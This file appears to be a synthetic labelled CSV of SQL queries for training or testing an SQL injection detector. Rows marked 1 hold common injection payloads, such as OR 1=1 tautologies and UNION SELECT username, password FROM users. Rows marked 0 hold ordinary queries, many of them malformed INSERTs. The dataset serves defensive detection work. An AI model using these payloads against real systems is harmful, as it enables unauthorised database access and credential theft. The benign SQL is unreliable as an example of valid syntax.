query,label
"' UNION SELECT username, password FROM users --",1
UPDATE customers SET status='Bob' WHERE user_id=7;,0
SELECT * FROM products WHERE password='' OR '1'='1';,1
UPDATE products SET password=1 WHERE user_id=4;,0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"INSERT INTO users (price, username, password) VALUES ('Alice');",0
"INSERT INTO cart (email, price, id) VALUES ('Alice');",0
' OR '1'='1' --,1
' OR 1=1 --,1
' OR 1=1 --,1
"INSERT INTO users (email, price) VALUES ('Bob');",0
' OR 1=1 --,1
SELECT id FROM customers WHERE id=2;,0
SELECT quantity FROM users WHERE user_id=4;,0
"INSERT INTO products (quantity) VALUES (100, 'Bob', 5);",0
SELECT * FROM customers WHERE price='' UNION SELECT password FROM users --;,1
DELETE FROM customers WHERE price>6;,0
SELECT * FROM products WHERE password='' UNION SELECT password FROM users --;,1
UPDATE users SET name=100 WHERE user_id=5;,0
SELECT * FROM cart WHERE password='' OR '1'='1';,1
' OR 1=1 --,1
"INSERT INTO users (status, price) VALUES ('test@example.com', 2, 5);",0
UPDATE orders SET email=5 WHERE country='4';,0
"SELECT price, id, quantity FROM orders WHERE country='4';",0
UPDATE products SET username='Bob' WHERE id=9;,0
' OR '1'='1' --,1
' OR '1'='1' --,1
' OR 1=1 --,1
UPDATE customers SET quantity='test@example.com' WHERE user_id=1;,0
"INSERT INTO customers (price) VALUES ('Alice', 100, 'Bob');",0
SELECT * FROM orders WHERE quantity='' OR '1'='1';,1
INSERT INTO cart (email) VALUES (1);,0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
INSERT INTO cart (id) VALUES ('test@example.com');,0
SELECT * FROM orders WHERE id='' UNION SELECT password FROM users --;,1
' OR 1=1 --,1
SELECT * FROM orders WHERE email='' OR 'a'='a';,1
SELECT * FROM cart WHERE password='' OR 'a'='a';,1
"SELECT id, email FROM customers WHERE country='10';",0
UPDATE users SET quantity=100 WHERE status='2';,0
"INSERT INTO users (id) VALUES ('test@example.com', 'Alice');",0
UPDATE customers SET email=2 WHERE status='10';,0
"SELECT price, email FROM customers WHERE status='1';",0
"INSERT INTO orders (username) VALUES ('Alice', 2, 'Bob');",0
UPDATE customers SET quantity=2 WHERE user_id=9;,0
DELETE FROM users WHERE id=6;,0
SELECT * FROM users WHERE id='' OR '1'='1';,1
SELECT * FROM products WHERE status='' OR '1'='1';,1
' OR 1=1 --,1
UPDATE customers SET password=100 WHERE id=8;,0
"SELECT email, name, status FROM orders WHERE id=1;",0
' OR 1=1 --,1
' OR 1=1 --,1
"INSERT INTO customers (username, id) VALUES ('Bob', 'Alice');",0
' OR '1'='1' --,1
SELECT * FROM products WHERE id='' OR '1'='1';,1
SELECT * FROM users WHERE quantity='' UNION SELECT password FROM users --;,1
SELECT * FROM users WHERE name='' UNION SELECT password FROM users --;,1
' OR 1=1 --,1
SELECT * FROM orders WHERE email='' OR '1'='1';,1
UPDATE customers SET username='Alice' WHERE id=1;,0
SELECT * FROM orders WHERE id='' OR '1'='1';,1
UPDATE products SET quantity='test@example.com' WHERE id=7;,0
' OR '1'='1' --,1
SELECT * FROM orders WHERE quantity='' OR 'a'='a';,1
SELECT email FROM customers WHERE status='9';,0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
"SELECT status, email FROM customers WHERE id=10;",0
SELECT * FROM users WHERE password='' UNION SELECT password FROM users --;,1
' OR 1=1 --,1
DELETE FROM orders WHERE country='2';,0
UPDATE cart SET name='test@example.com' WHERE status='6';,0
DELETE FROM users WHERE user_id=1;,0
' OR 1=1 --,1
DELETE FROM cart WHERE country='8';,0
"' UNION SELECT username, password FROM users --",1
SELECT password FROM orders WHERE price>10;,0
"' UNION SELECT username, password FROM users --",1
DELETE FROM cart WHERE status='9';,0
"SELECT password, username FROM orders WHERE country='8';",0
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
DELETE FROM users WHERE country='6';,0
SELECT * FROM customers WHERE name='' OR '1'='1';,1
"INSERT INTO users (username, name) VALUES ('Alice', 'test@example.com');",0
"INSERT INTO cart (status, price) VALUES (2, 1, 'Bob');",0
UPDATE orders SET name='test@example.com' WHERE id=8;,0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
UPDATE cart SET quantity=2 WHERE price>1;,0
"INSERT INTO products (price, name, username) VALUES ('Bob');",0
"SELECT quantity, name FROM cart WHERE user_id=4;",0
SELECT email FROM products WHERE id=2;,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
SELECT * FROM orders WHERE username='' UNION SELECT password FROM users --;,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM customers WHERE user_id=9;,0
UPDATE orders SET name=100 WHERE country='8';,0
' OR 1=1 --,1
' OR '1'='1' --,1
SELECT * FROM customers WHERE price='' OR '1'='1';,1
"INSERT INTO orders (quantity, id, status) VALUES ('Alice', 2, 5);",0
DELETE FROM cart WHERE user_id=7;,0
SELECT * FROM customers WHERE quantity='' OR '1'='1';,1
"SELECT quantity, id FROM products WHERE price>9;",0
SELECT * FROM users WHERE email='' UNION SELECT password FROM users --;,1
' OR '1'='1' --,1
SELECT * FROM products WHERE name='' OR '1'='1';,1
UPDATE orders SET email='Bob' WHERE status='6';,0
' OR '1'='1' --,1
SELECT name FROM cart WHERE status='3';,0
SELECT * FROM orders WHERE price='' OR '1'='1';,1
' OR 1=1 --,1
SELECT * FROM users WHERE password='' OR '1'='1';,1
"INSERT INTO orders (id, username) VALUES (2, 'test@example.com');",0
DELETE FROM products WHERE price>4;,0
UPDATE users SET password=1 WHERE country='10';,0
DELETE FROM cart WHERE price>2;,0
SELECT * FROM users WHERE quantity='' UNION SELECT password FROM users --;,1
"INSERT INTO orders (quantity, username) VALUES (100);",0
"' UNION SELECT username, password FROM users --",1
UPDATE customers SET price=100 WHERE price>3;,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
"INSERT INTO customers (name, id) VALUES (2, 'Bob', 5);",0
DELETE FROM orders WHERE status='4';,0
"INSERT INTO customers (username) VALUES ('Alice', 5);",0
' OR '1'='1' --,1
DELETE FROM customers WHERE price>8;,0
SELECT * FROM products WHERE id='' OR 'a'='a';,1
"INSERT INTO users (price) VALUES ('test@example.com', 2, 100);",0
DELETE FROM products WHERE status='3';,0
SELECT * FROM products WHERE id='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE username='' OR 'a'='a';,1
SELECT * FROM customers WHERE price='' UNION SELECT password FROM users --;,1
"INSERT INTO orders (quantity, username) VALUES (100, 1, 5);",0
"SELECT password, quantity FROM users WHERE status='9';",0
DELETE FROM users WHERE user_id=3;,0
' OR '1'='1' --,1
UPDATE cart SET status='test@example.com' WHERE price>8;,0
UPDATE products SET status=1 WHERE price>8;,0
SELECT * FROM products WHERE status='' UNION SELECT password FROM users --;,1
UPDATE cart SET price=2 WHERE id=8;,0
SELECT * FROM orders WHERE password='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
UPDATE products SET price='Bob' WHERE country='6';,0
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
' OR 1=1 --,1
UPDATE orders SET name='Bob' WHERE status='6';,0
' OR 1=1 --,1
' OR '1'='1' --,1
"SELECT price, name FROM products WHERE price>2;",0
DELETE FROM products WHERE price>9;,0
DELETE FROM orders WHERE status='10';,0
' OR 1=1 --,1
SELECT * FROM products WHERE price='' UNION SELECT password FROM users --;,1
"INSERT INTO cart (username, quantity, email) VALUES (5, 2);",0
SELECT * FROM customers WHERE username='' OR '1'='1';,1
' OR '1'='1' --,1
UPDATE products SET quantity='test@example.com' WHERE id=2;,0
"INSERT INTO cart (id, username) VALUES (5, 100);",0
"SELECT id, name, username FROM customers WHERE status='9';",0
DELETE FROM orders WHERE price>5;,0
SELECT * FROM cart WHERE id='' UNION SELECT password FROM users --;,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM orders WHERE id=10;,0
UPDATE cart SET username='test@example.com' WHERE id=5;,0
DELETE FROM customers WHERE status='4';,0
"SELECT status, username FROM customers WHERE country='10';",0
"SELECT username, password FROM users WHERE user_id=6;",0
' OR 1=1 --,1
UPDATE users SET password=1 WHERE id=5;,0
"INSERT INTO customers (id, name, password) VALUES ('Bob');",0
"SELECT email, name FROM products WHERE id=9;",0
SELECT * FROM cart WHERE password='' OR 'a'='a';,1
SELECT * FROM orders WHERE email='' UNION SELECT password FROM users --;,1
UPDATE customers SET password=2 WHERE id=9;,0
"SELECT quantity, email FROM products WHERE country='7';",0
DELETE FROM users WHERE user_id=5;,0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE status='' OR 'a'='a';,1
UPDATE orders SET status=1 WHERE id=3;,0
SELECT * FROM products WHERE name='' OR 'a'='a';,1
SELECT * FROM products WHERE username='' UNION SELECT password FROM users --;,1
DELETE FROM cart WHERE user_id=6;,0
"SELECT name, id, email FROM orders WHERE country='2';",0
"SELECT quantity, status FROM customers WHERE price>6;",0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE id='' UNION SELECT password FROM users --;,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM cart WHERE country='5';,0
DELETE FROM users WHERE user_id=8;,0
"INSERT INTO users (quantity) VALUES (5, 'test@example.com');",0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
UPDATE users SET email=100 WHERE price>5;,0
SELECT * FROM cart WHERE password='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT * FROM products WHERE status='' OR '1'='1';,1
"SELECT price, quantity, id FROM orders WHERE price>10;",0
SELECT * FROM orders WHERE email='' UNION SELECT password FROM users --;,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
"INSERT INTO orders (price, quantity) VALUES ('Alice', 'test@example.com');",0
SELECT password FROM customers WHERE price>6;,0
' OR '1'='1' --,1
SELECT status FROM products WHERE price>6;,0
"SELECT username, name, id FROM cart WHERE status='6';",0
SELECT * FROM orders WHERE username='' UNION SELECT password FROM users --;,1
"INSERT INTO cart (username, price, id) VALUES (100);",0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE price='' OR '1'='1';,1
' OR 1=1 --,1
SELECT * FROM users WHERE password='' OR 'a'='a';,1
SELECT quantity FROM products WHERE user_id=3;,0
"INSERT INTO products (quantity, status, name) VALUES (2, 'Alice', 5);",0
"INSERT INTO cart (status, id, email) VALUES (5, 'Bob');",0
UPDATE cart SET quantity=1 WHERE id=2;,0
DELETE FROM products WHERE country='10';,0
' OR 1=1 --,1
SELECT * FROM cart WHERE status='' UNION SELECT password FROM users --;,1
DELETE FROM orders WHERE id=2;,0
' OR 1=1 --,1
SELECT * FROM users WHERE status='' OR '1'='1';,1
UPDATE orders SET price=5 WHERE country='4';,0
SELECT * FROM users WHERE status='' OR 'a'='a';,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
UPDATE products SET name='Bob' WHERE country='7';,0
UPDATE products SET status=2 WHERE price>7;,0
UPDATE users SET email=1 WHERE user_id=5;,0
"INSERT INTO customers (email, status, name) VALUES ('Alice', 'Bob', 5);",0
SELECT * FROM orders WHERE quantity='' OR 'a'='a';,1
"SELECT id, username, status FROM products WHERE user_id=1;",0
"SELECT password, quantity FROM cart WHERE id=6;",0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE status='' OR 'a'='a';,1
SELECT * FROM users WHERE quantity='' OR '1'='1';,1
"SELECT password, username, id FROM products WHERE user_id=5;",0
SELECT * FROM products WHERE status='' OR '1'='1';,1
"SELECT quantity, price, password FROM customers WHERE price>8;",0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM customers WHERE status='' UNION SELECT password FROM users --;,1
UPDATE products SET status=2 WHERE user_id=3;,0
DELETE FROM users WHERE user_id=5;,0
SELECT * FROM users WHERE name='' OR '1'='1';,1
"SELECT name, quantity FROM customers WHERE user_id=5;",0
SELECT * FROM customers WHERE price='' OR '1'='1';,1
SELECT * FROM customers WHERE name='' UNION SELECT password FROM users --;,1
UPDATE products SET email='test@example.com' WHERE user_id=5;,0
UPDATE products SET quantity='Alice' WHERE country='2';,0
' OR 1=1 --,1
SELECT * FROM cart WHERE quantity='' UNION SELECT password FROM users --;,1
SELECT status FROM products WHERE country='2';,0
SELECT * FROM orders WHERE status='' UNION SELECT password FROM users --;,1
SELECT * FROM orders WHERE name='' OR 'a'='a';,1
SELECT * FROM orders WHERE username='' OR 'a'='a';,1
"INSERT INTO cart (id) VALUES (2, 100);",0
DELETE FROM products WHERE country='2';,0
SELECT status FROM cart WHERE id=4;,0
SELECT * FROM customers WHERE status='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
' OR '1'='1' --,1
' OR '1'='1' --,1
' OR '1'='1' --,1
SELECT * FROM orders WHERE name='' OR '1'='1';,1
UPDATE orders SET status='Bob' WHERE country='1';,0
UPDATE cart SET username='Alice' WHERE status='2';,0
SELECT * FROM orders WHERE password='' OR 'a'='a';,1
"SELECT status, password, username FROM customers WHERE user_id=5;",0
"SELECT username, price FROM cart WHERE status='1';",0
"SELECT password, price, name FROM cart WHERE status='2';",0
' OR 1=1 --,1
DELETE FROM customers WHERE country='8';,0
UPDATE customers SET name='Alice' WHERE id=9;,0
SELECT * FROM customers WHERE name='' OR 'a'='a';,1
"INSERT INTO cart (username, id, password) VALUES (100);",0
SELECT * FROM cart WHERE email='' OR 'a'='a';,1
SELECT * FROM products WHERE password='' OR 'a'='a';,1
DELETE FROM users WHERE price>2;,0
DELETE FROM products WHERE country='5';,0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"INSERT INTO orders (status, username, price) VALUES (2, 1);",0
' OR '1'='1' --,1
UPDATE users SET email='test@example.com' WHERE status='7';,0
SELECT * FROM products WHERE email='' OR 'a'='a';,1
"INSERT INTO users (status, quantity) VALUES ('Bob', 'Alice', 100);",0
DELETE FROM cart WHERE price>10;,0
' OR '1'='1' --,1
INSERT INTO orders (email) VALUES (5);,0
' OR 1=1 --,1
"SELECT price, name FROM customers WHERE user_id=3;",0
"INSERT INTO cart (quantity, price) VALUES ('Bob', 'test@example.com');",0
"SELECT name, password FROM users WHERE price>8;",0
"INSERT INTO customers (quantity, password, name) VALUES ('test@example.com', 'Alice');",0
SELECT * FROM orders WHERE username='' OR 'a'='a';,1
' OR '1'='1' --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM cart WHERE status='' OR 'a'='a';,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
UPDATE cart SET name='Alice' WHERE price>2;,0
DELETE FROM users WHERE country='10';,0
' OR 1=1 --,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
DELETE FROM products WHERE country='6';,0
' OR '1'='1' --,1
UPDATE products SET id='test@example.com' WHERE id=7;,0
SELECT * FROM products WHERE id='' OR '1'='1';,1
UPDATE cart SET quantity='test@example.com' WHERE user_id=7;,0
SELECT status FROM users WHERE user_id=2;,0
"INSERT INTO cart (username, email, quantity) VALUES (2, 1, 'Bob');",0
UPDATE products SET name=100 WHERE status='5';,0
"SELECT password, name FROM cart WHERE status='7';",0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
"SELECT username, quantity FROM cart WHERE price>4;",0
UPDATE orders SET quantity=5 WHERE status='9';,0
' OR 1=1 --,1
SELECT * FROM cart WHERE name='' OR 'a'='a';,1
DELETE FROM customers WHERE price>1;,0
SELECT * FROM customers WHERE name='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE password='' OR 'a'='a';,1
DELETE FROM customers WHERE country='6';,0
' OR '1'='1' --,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
DELETE FROM cart WHERE country='10';,0
"INSERT INTO users (password, username, quantity) VALUES (100, 1, 'Alice');",0
SELECT * FROM orders WHERE password='' OR 'a'='a';,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
"SELECT password, price FROM products WHERE id=3;",0
"SELECT name, id FROM products WHERE price>3;",0
' OR '1'='1' --,1
SELECT * FROM users WHERE email='' OR 'a'='a';,1
DELETE FROM products WHERE user_id=10;,0
SELECT * FROM products WHERE status='' OR '1'='1';,1
"INSERT INTO orders (price, email, quantity) VALUES ('test@example.com');",0
' OR '1'='1' --,1
SELECT username FROM customers WHERE country='8';,0
SELECT * FROM users WHERE email='' OR '1'='1';,1
SELECT * FROM orders WHERE username='' UNION SELECT password FROM users --;,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE username='' OR '1'='1';,1
SELECT * FROM cart WHERE password='' OR 'a'='a';,1
UPDATE customers SET email=1 WHERE status='10';,0
SELECT * FROM cart WHERE quantity='' OR 'a'='a';,1
SELECT * FROM users WHERE price='' OR '1'='1';,1
"INSERT INTO products (price, password, status) VALUES (5, 1);",0
SELECT * FROM customers WHERE username='' OR '1'='1';,1
DELETE FROM orders WHERE id=1;,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE status='' UNION SELECT password FROM users --;,1
' OR 1=1 --,1
"SELECT price, status FROM users WHERE price>2;",0
' OR '1'='1' --,1
SELECT * FROM customers WHERE password='' OR '1'='1';,1
"' UNION SELECT username, password FROM users --",1
"SELECT password, status, username FROM products WHERE id=1;",0
' OR 1=1 --,1
SELECT price FROM orders WHERE user_id=9;,0
' OR 1=1 --,1
DELETE FROM orders WHERE id=2;,0
DELETE FROM users WHERE status='4';,0
' OR 1=1 --,1
SELECT * FROM orders WHERE password='' OR '1'='1';,1
